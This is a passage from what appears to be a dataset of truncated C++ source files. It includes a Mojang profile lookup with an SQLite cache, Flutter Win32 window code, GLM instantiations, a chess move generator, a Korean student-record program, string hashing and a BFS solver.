CURLOPT_ERRORBUFFER, &error);\n    CURLcode res = curl_easy_perform(curl);\n    long http_code;\n    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);\n    if (res != CURLE_OK) {\n        *error_out = error;\n        return {};\n    } else if (http_code == 200) {\n        return parse_profile(response.c_str());\n    } else {\n        *error_out = \"Mojang API returned http code \" + std::to_string(http_code);\n        return {};\n    }\n}\n\nstd::optional<Profile> fetch_profile_by_uuid(const char* uuid, std::string* error) {\n    std::string url = std::string{\"https://sessionserver.mojang.com/session/minecraft/profile/\"} + uuid;\n    return fetch_profile(url.c_str(), error);\n}\n\nstd::optional<Profile> fetch_profile_by_name(const char* name, std::string* error) {\n    std::string url = std::string{\"https://api.mojang.com/users/profiles/minecraft/\"} + name;\n    return fetch_profile(url.c_str(), error);\n}\n\nvoid update_cache(sqlite3* db, const char* uuid, const char* name, int64_t created_at) {\n    const char *sql = \"INSERT OR REPLACE INTO mc_profile_cache(uuid, name, created_at) VALUES(?, ?, ?)\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, uuid, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_text(stmt, 2, name, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_int64(stmt, 3, created_at);\n    sqlite3_step(stmt);\n    sqlite3_finalize(stmt);\n}\n\nvoid lookup0(sqlite3_context* ctx, const char* argument, bool uuid) {\n    sqlite3* db = sqlite3_context_db_handle(ctx);\n\n    auto fetch = uuid ? fetch_profile_by_uuid : fetch_profile_by_name;\n    const char *sql = uuid ?\n            \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE uuid = ?\"\n            : \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE name = ?\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, argument, -1, SQLITE_TRANSIENT);\n\n    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n    constexpr int64_t millis_in_hour = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::hours{1}).count();\n    // Execute SQL statement\n    int err = sqlite3_step(stmt);\n    if (err == SQLITE_ROW) {\n        auto cached_name = (const char*) sqlite3_column_text(stmt, 0);\n        auto cached_uuid = (const char*) sqlite3_column_text(stmt, 1);\n        auto cached_result = uuid ? cached_name : cached_uuid;\n        int64_t created_at = sqlite3_column_int64(stmt, 2);\n        if (now - created_at < millis_in_hour) {\n            sqlite3_result_text(ctx, cached_result, strlen(cached_result), SQLITE_TRANSIENT);\n        } else {\n            std::string erro",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"chess.h\"\n\nChessBase* Game::chess[8][8];\nChessBase* Game::chess2[8][8];\nbool Game::_Castling[2][2];\nshort Game::En_passant[2];\n\nChessBase::ChessBase(short ROW, short COL, Player P){\n    r = ROW;\n    c = COL;\n    p = P;\n}\n\ntemplate <ChessType __CT>\nChess<__CT>::Chess(short ROW, short COL, Player P):\nChessBase(ROW, COL, P){\n    r = ROW;\n    c = COL;\n    p = P;\n}\n\ntemplate <ChessType __CT>\nChessType Chess<__CT>::Type(){\n    return __CT;\n}\n\ntemplate <ChessType __CT>\nshort** Chess<__CT>::Valid(){\n    short** i = new short*[1];\n    for(short s=0; s<1; s++){\n        i[s] = new short[2];\n        i[s][0] = -1;\n        i[s][1] = -1;\n    }\n    return i;\n}\n\ntemplate <>\nshort** Chess<King>::Valid(){\n    short Temp[2] = {0, 7};\n    short** valid = new short*[20];\n    for(short i=0; i<20; i++){\n        valid[i] = new short[2];\n        valid[i][0] = valid[i][1] = -1;\n    }\n    short cur=0;\n    if(r>0 && Game::chess[r-1][c]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r-1, c);\n        if(!Game::KingInCheck2(p, r-1, c)){\n            valid[cur][0] = r-1;\n            valid[cur][1] = c;\n            cur++;\n        }\n    }\n    if(r<7 && Game::chess[r+1][c]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r+1, c);\n        if(!Game::KingInCheck2(p, r+1, c)){\n            valid[cur][0] = r+1;\n            valid[cur][1] = c;\n            cur++;\n        }\n    }\n    if(c>0 && Game::chess[r][c-1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r, c-1);\n        if(!Game::KingInCheck2(p, r, c-1)){\n            valid[cur][0] = r;\n            valid[cur][1] = c-1;\n            cur++;\n        }\n    }\n    if(c<7 && Game::chess[r][c+1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r, c+1);\n        if(!Game::KingInCheck2(p, r, c+1)){\n            valid[cur][0] = r;\n            valid[cur][1] = c+1;\n            cur++;\n        }\n    }\n    if(r>0 && c>0 && Game::chess[r-1][c-1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r-1, c-1);\n        if(!Game::KingInCheck2(p, r-1, c-1)){\n            valid[cur][0] = r-1;\n            valid[cur][1] = c-1;\n            cur++;\n        }\n    }\n    if(r>0 && c<7 && Game::chess[r-1][c+1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r-1, c+1);\n        if(!Game::KingInCheck2(p, r-1, c+1)){\n            valid[cur][0] = r-1;\n            valid[cur][1] = c+1;\n            cur++;\n        }\n    }\n    if(r<7 && c>0 && Game::chess[r+1][c-1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r+1, c-1);\n        if(!Game::KingInCheck2(p, r+1, c-1)){\n            valid[cur][0] = r+1;\n            valid[cur][1] = c-1;\n            cur++;\n        }\n    }\n    if(r<7 && c<7 && Game::chess[r+1][c+1]->p!=p){\n        Game::CopyChess();\n        Game::MoveChess2(r, c, r+1, c+1);\n        if(!Game::KingInCheck2(p, r+1, c+1)){\n            valid[cur][0] = r+1;\n            valid[cur][1] = c+1;\n            cur++;\n        }\n    }\n    if(Game::CanCastling(p, true)){\n        switch (Options::CP){\n            case Both:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 6;\n                cur++;\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 7;\n                cur++;\n                break;\n            case King2Tiles:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 6;\n                cur++;\n                break;\n            case KingOnRook:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 7;\n                cur++;\n                break;\n        }\n    }\n    if(Game::CanCastling(p, false)){\n        switch (Options::CP){\n            case Both:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 2;\n                cur++;\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 0;\n                cur++;\n                break;\n            case King2Tiles:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 2;\n                cur++;\n                break;\n            case KingOnRook:\n                valid[cur][0] = Temp[(short)p-1];\n                valid[cur][1] = 0;\n                cur++;\n                break;\n        }\n    }\n    return valid;\n}\n\ntemplate <>\nshort** Chess<Queen>::Valid(){\n    short** valid = new short*[30];\n    for(short i=0; i<30; i++){\n        valid[i] = new short[2];\n        valid[i][0] = valid[i][1] = -1;\n    }\n    short cur=0;\n    short* KingPos = Game::FindKing(p);\n    for(short i=1; i<8; i++){\n        if(r-i<0 || c-i<0 || Game::chess[r-i][c-i]->p==p){\n            break;\n        }\n        else if(Game::chess[r-i][c-i]->Type()==Null){\n            Game::CopyChess();\n            Game::MoveChess2(r, c, r-i, c-i);\n            if(!Game::KingInCheck2(p, KingPos[0], KingPos[1])){\n                valid[cur][0] = r-i;\n                valid[cur][1] = c-i;\n                cur++;\n            }\n        ",
    "#include \"MyFunction.h\"\n\n\nnamespace My_Functions \n{\n\tvoid inputStudent(int studentnum, vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\t//studentnum;\n\t\tcout << \"\ud559\uc0dd \uc218\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\t\tcin >> studentnum;\n\n\t\tfor (int i = 0; i < studentnum; ++i)\n\t\t{\n\t\t\tstring name;\n\t\t\tcout << \"\uc774\ub984\uc744 \uc785\ub825\ud558\uc138\uc694 : \";\n\t\t\tcin >> name;\n\t\t\tnames.push_back(name);\n\n\n\t\t\tint age;\n\t\t\tcout << \"\ub098\uc774\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\t\t\tcin >> age;\n\t\t\tages.push_back(age);\n\n\t\t\tstring birth;\n\t\t\tcout << \"\uc0dd\uc77c\uc744 \uc785\ub825\ud574\uc8fc\uc138\uc694 (mmdd \ud615\uc2dd) : \";\n\t\t\tcin >> birth;\n\t\t\tbirths.push_back(birth);\n\t\t}\n\t}\n\n\tvoid printStudent(vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\tcout << endl;\n\n\t\tcout << \" \ud559\uc0dd \uc815\ubcf4  \" << endl;\n\n\t\tfor (int i = 0; i < names.size(); i++)\n\t\t{\n\t\t\tcout << \"\uc774\ub984 : \" << names[i] << \" \ub098\uc774 : \" << ages[i] << \" \uc0dd\uc77c : \" << births[i] << endl;\n\n\t\t}\n\t\tcout << endl;\n\t}\n\n\tvoid printAverage(vector<int>& ages)\n\t{\n\t\tint totalage = 0; // \uc804\uccb4 \ub098\uc774 \ud569 \ubcc0\uc218\n\n\t\t//ages \ubcc0\uc218\uc5d0 \uc800\uc7a5\ub41c \uac01 \ud559\uc0dd\uc758 \ub098\uc774\ub97c totalage\uc5d0 \ub354\ud568\n\t\tfor (int age : ages)\n\t\t{\n\t\t\ttotalage += age;\n\t\t}\n\t\t// \ud3c9\uade0\ub098\uc774 \uacc4\uc0b0\n\t\tdouble average = double(totalage) / ages.size();\n\n\t\tcout << \"\ud3c9\uade0 \ub098\uc774 : \" << average << \"\uc138\" << endl;\n\t\tcout << endl;\n\t}\n\n\tvoid printFastbirth(int studentnum, vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\tstring earlybirth = \"1231\"; //\ucd08\uae30\uac12\uc740 \uac00\uc7a5 \ud070 \uc0dd\uc77c\uac12\n\t\tstring earlyname;\n\t\tint earlyage = 0;\n\n\t\tfor (int i = 0; i < names.size(); i++)\n\t\t{\n\t\t\tif (births[i] < earlybirth)\n\t\t\t{\n\t\t\t\tearlybirth = births[i];\n\t\t\t\tearlyname = names[i];\n\t\t\t\tearlyage = ages[i];\n\t\t\t}\n\t\t}\n\t\tcout << \"\uac00\uc7a5 \ube60\ub978 \uc0dd\uc77c\uc740 \uc774\ub984 : \" << earlyname << \" \ub098\uc774 : \" << earlyage << \"\uc138 \uc0dd\uc77c : \" << earlybirth << endl;\n\n\t\tcout << endl;\n\t}\n\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n#define all(x) x.begin(), x.end()\n#define ll long long\n#define nl cout << \"\\n\"\n#define int long long\n#define nl cout << \"\\n\"\nconst ll M = 1e9+7;\n\n// calculate a^b % MOD using binary expo.\nll power(ll a, ll b)\n{\n    a = a % M;\n    ll res = 1;\n    while (b)\n    {\n        if (b & 1)\n            res = (a*res)%M ;\n        a = (a*a)%M;\n        b >>= 1;\n    }\n    return res;\n}\n\n\n// finds modular inverse of a w.r.t M\nll modularInverse(ll a) {return power(a, M - 2);}\n\n\n// still there are small chances of hash-collisions  \n// so check that too \nclass HashedString{\npublic:    \n    vector<ll> ps,psi, hash;\n    // change p and M if needed\n    ll p = 31; // a prime number\n    // const ll M = 1e9+7; \n\n    HashedString(string &s){\n        ll n = s.size();\n        ps = vector<ll>(n,1);\n        psi = vector<ll>(n);\n        hash = vector<ll>(n);\n\n        for(ll i=1; i<n; i++)\n            ps[i] = (ps[i-1] * p )%M;\n        \n        for(ll i=0; i<n; i++)\n            psi[i] = modularInverse(ps[i]);\n        \n        hash[0] = (ctoi(s[0]) * ps[0])%M;\n        for(ll i=1; i<n; i++)\n            hash[i] =  (hash[i-1] + (ctoi(s[i]) * ps[i])%M ) %M;\n        \n    }\n\n\n    // change it as per need\n    ll ctoi(char c){\n        // return int(c-'a'+1);\n        return c;\n    }\n\n    // get hash value of substring that starts at i and ends at j\n    ll getHash(int i, int j){\n        if(i == 0)\n            return hash[j];\n\n        return (\n            ((hash[j]-hash[i-1]+M) % M)\n            * psi[i]\n        ) % M;\n    }\n\n    // start index and length of sub-string\n    ll getHashFromLen(int i, int len){\n        return getHash(i, i+len-1);\n    }\n};\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <algorithm>\n#include <vector>\n#include <deque>\nusing namespace std;\nint M,N;\nvector<pair<int,int>> teacher;\nint bfs();\nbool availableLine(int x, int y);\nbool isTeacher(int x,int y);\n\nint** dp;\n\nint main()\n{\n\tcin>>N>>M;\n\tteacher.resize(M);\n\tdp = new int*[2*N];\n\tfor(int i=0;i<2*N;i++)\n\t\tdp[i] = new int[N];\n\tfor(int i=0;i<2*N;i++)\n\t\tfor(int j=0;j<N;j++)\n\t\t\tdp[i][j]=0;\n\tfor(int i=0;i<M;i++)\n\t{\n\t\tcin >> teacher[i].first>>teacher[i].second;\n\t}\n\n\tcout << bfs();\n}\n\nint bfs()\n{\n\tint res=0;\n\tdeque<pair<int,int>> dq;\n\tdq.push_back({0,0});\n\twhile(!dq.empty())\n\t{\n\t\t\n\t\tpair<int,int> p = dq.front();\n\t\tdq.pop_front();\n\t\tif(p.first==2*N)\n\t\t\treturn res;\n\t\tif(dp[p.first][p.second]==1)\n\t\t\tcontinue;\n\n\n\t\tres = max(res,p.second);\n\t\tint dx = p.first+1;\n\t\tint dy = p.second+1;\n\t\tif(availableLine(dx,dy))\n\t\t{\n\t\t\tif(!isTeacher(dx,dy))\n\t\t\t\t\tdq.push_back({dx,dy});\n\t\t}\n\t\tdy = p.second-1;\n\t\tif(availableLine(dx,dy))\n\t\t{\n\t\t\tif(!isTeacher(dx,dy))\n\t\t\t\t\tdq.push_back({dx,dy});\n\t\t}\n\n\t}\n\treturn -1;\n}\n\nbool availableLine(int x,int y)\n{\n\tif(y<0||y>N||x>2*N)\n\t\treturn false;\n\t\n\tif(x+y>2*N)\n\t\treturn false;\n\n\treturn true;\n}\n\nbool isTeacher(int x,int y)\n{\n\tint i=0;\n\tfor(i=0;i<teacher.size();++i)\n\t{\n\t\tif(teacher[i].first==x&&teacher[i].second==y)\n\t\t\treturn true;\n\t}\n\treturn false;\n}\n",
